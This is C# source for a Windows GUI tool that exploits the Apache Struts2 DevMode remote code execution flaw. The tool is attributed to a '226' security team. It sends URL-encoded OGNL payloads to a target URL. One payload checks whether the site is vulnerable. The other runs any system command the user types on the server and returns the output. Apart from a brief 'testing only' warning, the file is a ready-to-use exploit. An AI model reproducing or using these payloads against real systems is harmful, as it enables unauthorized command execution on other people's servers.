using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
namespace Struts
{
	public class Form1 : Form
	{
        private IContainer components = null;
        private TabControl tabControl1;
        private TabPage tabPage2;
		private TextBox p_cmd;
		private Button p_startCmd;
		private TextBox p_txt_cmd;
        private Label label5;
        private Label label1;
        private TextBox p_url;
        private TabPage tabPage3;
        private Button button1;
        private TextBox p_mubiao;
        private Button button2;
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}
		private void InitializeComponent()
		{
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.button2 = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.p_mubiao = new System.Windows.Forms.TextBox();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.p_startCmd = new System.Windows.Forms.Button();
            this.p_txt_cmd = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.p_cmd = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.p_url = new System.Windows.Forms.TextBox();
            this.tabControl1.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.SuspendLayout();
            // 
            // tabControl1
            // 
            this.tabControl1.Appearance = System.Windows.Forms.TabAppearance.FlatButtons;
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new System.Drawing.Point(7, 37);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(735, 392);
            this.tabControl1.TabIndex = 1;
            // 
            // tabPage3
            // 
            this.tabPage3.Controls.Add(this.button2);
            this.tabPage3.Controls.Add(this.button1);
            this.tabPage3.Controls.Add(this.p_mubiao);
            this.tabPage3.Location = new System.Drawing.Point(4, 25);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(727, 363);
            this.tabPage3.TabIndex = 3;
            this.tabPage3.Text = "目标网站信息";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.button2.Location = new System.Drawing.Point(166, 15);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(126, 23);
            this.button2.TabIndex = 12;
            this.button2.Text = "清空检测信息";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.button1.Location = new System.Drawing.Point(6, 15);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(126, 23);
            this.button1.TabIndex = 11;
            this.button1.Text = "检测是否存在";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // p_mubiao
            // 
            this.p_mubiao.Location = new System.Drawing.Point(6, 58);
            this.p_mubiao.Multiline = true;
            this.p_mubiao.Name = "p_mubiao";
            this.p_mubiao.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.p_mubiao.Size = new System.Drawing.Size(714, 299);
            this.p_mubiao.TabIndex = 6;
            this.p_mubiao.Text = "链接格式：例如：http://www.226safe.com/demo/index.action";
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.p_startCmd);
            this.tabPage2.Controls.Add(this.p_txt_cmd);
            this.tabPage2.Controls.Add(this.label5);
            this.tabPage2.Controls.Add(this.p_cmd);
            this.tabPage2.Location = new System.Drawing.Point(4, 25);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(727, 363);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "系统命令执行";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // p_startCmd
            // 
            this.p_startCmd.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.p_startCmd.Location = new System.Drawing.Point(596, 11);
            this.p_startCmd.Name = "p_startCmd";
            this.p_startCmd.Size = new System.Drawing.Size(126, 23);
            this.p_startCmd.TabIndex = 10;
            this.p_startCmd.Text = "执行系统命令";
            this.p_startCmd.UseVisualStyleBackColor = true;
            this.p_startCmd.Click += new System.EventHandler(this.btn_startCmd_Click);
            // 
            // p_txt_cmd
            // 
            this.p_txt_cmd.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.p_txt_cmd.Location = new System.Drawing.Point(112, 12);
            this.p_txt_cmd.Name = "p_txt_cmd";
            this.p_txt_cmd.Size = new System.Drawing.Size(478, 21);
            this.p_txt_cmd.TabIndex = 9;
            this.p_txt_cmd.Text = "netstat -an";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(5, 17);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(101, 12);
            this.label5.TabIndex = 8;
            this.label5.Text = "请输入系统命令：";
            // 
            // p_cmd
            // 
            this.p_cmd.Location = new System.Drawing.Point(7, 39);
            this.p_cmd.Multiline = true;
            this.p_cmd.Name = "p_cmd";
            this.p_cmd.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.p_cmd.Size = new System.Drawing.Size(715, 297);
            this.p_cmd.TabIndex = 5;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(6, 15);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(101, 12);
            this.label1.TabIndex = 15;
            this.label1.Text = "请输入目标站点：";
            // 
            // p_url
            // 
            this.p_url.Location = new System.Drawing.Point(113, 12);
            this.p_url.Name = "p_url";
            this.p_url.Size = new System.Drawing.Size(635, 21);
            this.p_url.TabIndex = 14;
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(741, 444);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.p_url);
            this.Controls.Add(this.tabControl1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "struts2任意代码执行漏洞更新版 漏洞:DevMode 来自:226安全团队 漏洞来源;启明星辰";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.tabControl1.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.tabPage3.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

		}

		public Form1()
		{
			this.InitializeComponent();
			Control.CheckForIllegalCrossThreadCalls = false;
		}

		public string getHtml(string url, string data, string htmlEncode)
		{
			string result;
			
				Uri requestUri = new Uri(url);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUri);
				httpWebRequest.UserAgent = "Mozilla/5.0";
				httpWebRequest.Accept = "*/*";
				httpWebRequest.Method = "POST";
				httpWebRequest.Timeout = 40000;
				httpWebRequest.KeepAlive = true;
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.ContentType = "application/x-www-form-urlencoded";
				byte[] bytes = Encoding.ASCII.GetBytes(data);
				httpWebRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = httpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), Encoding.GetEncoding(htmlEncode));
				string text = streamReader.ReadToEnd().Replace("\n", "\r\n");
				result = text;
				return result;
	
		}

        private void btn_startCmd_Click(object sender, EventArgs e)
        {
            if (p_url.Text != "")
            {
                string text = this.p_txt_cmd.Text;
                string code = "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=" + text;
                string html = this.getHtml(this.p_url.Text, code, "UTF-8");
                this.p_cmd.Text = html;
            }
            else
            {
                MessageBox.Show("请先输入URL");
                
            }
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("此工具仅仅作为辅助测试使用，请勿用于非法用途，否则后果自负！\r\n", "226安全提示");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (p_url.Text != "")
            {

                string code = "debug=command&expression=(%23wr%3D%23context[%23parameters.obj[0]].getWriter())!%3D(%23wr.println(%23parameters.content[0]))!%3D(%23wr.flush())!%3D(%23wr.close())&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Adlabgsrc";
                string html = this.getHtml(this.p_url.Text, code, "UTF-8");
                this.p_mubiao.Text = "检测Adlabgsrc，返回true或Adlabgsrc,则为存在漏洞！！ \r\n\r\n" + html;

            }
            else
            {
                MessageBox.Show("请输入URL");
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            p_mubiao.Text = "";
        }
            
        }
	
		
	}
